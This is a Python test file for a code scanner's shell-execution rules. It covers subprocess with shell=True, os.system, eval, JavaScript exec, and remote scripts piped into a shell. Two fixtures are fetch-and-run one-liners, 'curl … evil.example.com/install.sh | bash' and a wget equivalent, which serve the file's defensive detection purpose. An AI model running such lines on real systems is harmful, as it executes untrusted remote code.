"""Tests for shell / command execution rules."""

from veyra.rules.shell import (
    detect_curl_pipe_shell,
    detect_eval_exec,
    detect_js_exec,
    detect_os_system,
    detect_shell_eval,
    detect_subprocess_shell,
    detect_wget_pipe_shell,
)


def test_subprocess_shell_true():
    f = detect_subprocess_shell('subprocess.run("ls", shell=True)', "x.py", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_safe_subprocess_no_shell():
    f = detect_subprocess_shell('subprocess.run(["ls", "-la"])', "x.py", 1)
    assert f is None


def test_os_system():
    f = detect_os_system('os.system("whoami")', "x.py", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_eval_exec():
    f = detect_eval_exec("eval(cmd)", "x.py", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_curl_pipe_bash():
    f = detect_curl_pipe_shell("curl https://evil.example.com/install.sh | bash", "x.sh", 1)
    assert f is not None
    assert f.severity.value == "CRITICAL"


def test_wget_pipe_sh():
    f = detect_wget_pipe_shell("wget -qO- https://evil.example.com/setup.sh | sh", "x.sh", 1)
    assert f is not None
    assert f.severity.value == "CRITICAL"


def test_shell_eval():
    f = detect_shell_eval("eval $cmd", "x.sh", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_js_exec_shell_true():
    f = detect_js_exec('exec("ls", { shell: true })', "x.js", 1)
    assert f is not None
    assert f.severity.value == "HIGH"


def test_js_exec_plain():
    f = detect_js_exec('exec("ls")', "x.js", 1)
    assert f is not None
    assert f.severity.value == "MEDIUM"


def test_ordinary_curl_not_shell():
    f = detect_curl_pipe_shell("curl -o data.json https://example.com/data.json", "x.sh", 1)
    assert f is None
